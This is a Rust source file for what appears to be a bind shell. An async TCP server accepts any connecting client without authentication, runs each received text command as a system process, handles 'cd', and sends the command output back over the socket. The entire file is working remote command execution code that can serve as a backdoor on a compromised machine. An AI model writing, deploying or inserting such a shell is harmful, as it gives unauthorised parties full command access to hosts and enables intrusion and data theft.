use std::env::{args,set_current_dir};
use std::process;
use log::Level;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

async fn read_command(conn: &mut TcpStream) -> String {
    let mut cmd = String::with_capacity(256);
    let mut c: [u8; 1] = [0];
    while conn.read_exact(&mut c).await.is_ok() && c[0] != 0 {
        cmd.push(c[0] as char);
    }
    cmd
}

fn execute_send_command(args: Vec<&str>) -> Result<String, String> {
    if args[0].trim() == "exit" { return Err("exit".into()) }
    if args[0].trim() == "stop" { process::exit(0); }

    if args[0].trim() == "cd" {
        if args.len() != 2 {
            return Err("missing path".into())
        }
        match set_current_dir(args[1]) {
            Ok(_) => return Ok("changed dir with success".into()),
            Err(_) => return Err("error when changing dir".into())
        };
    }

    let Ok(output) = process::Command::new(args[0]).args(&args[1..]).output() else { return Err("command error".into()) };
    let Ok(output) = String::from_utf8(output.stdout) else { return Err("command output error".into()) };
    Ok(format!("{}", output))
}

async fn handle_client(mut conn: TcpStream) {
    loop {
        let cmd = read_command(&mut conn).await;
        if cmd.is_empty() { return }
        log::info!("{cmd}");
        let args: Vec<&str> = cmd.split(" ").collect();
        match execute_send_command(args) {
            Ok(m) => if conn.write_all(format!("{m}\0").as_bytes()).await.is_err() { return } else { continue },
            Err(e) => if e == "exit" || conn.write_all(format!("{}\0", e).as_bytes()).await.is_err() { return },
        };
    }
}

#[tokio::main]
async fn main() {
    simple_logger::init_with_level(Level::Info).unwrap();

    let args: Vec<String> = args().collect();
    if args.len() != 3 {
        return eprintln!("Usage: {} [ip] [port]", args[0]);
    }

    let addr = format!("{}:{}", args[1], args[2]);
    let serv = match TcpListener::bind(&addr).await {
        Ok(serv) => serv,
        Err(e) => return eprintln!("{e}"),
    };
    log::info!("Listening on {}", addr);

    loop {
        let Ok(client) = serv.accept().await else { continue };
        tokio::spawn(async move { 
            log::info!("{} Appeared", client.1.to_string());
            handle_client(client.0).await ;
            log::info!("{} is Gone", client.1.to_string());
        });
    }
}
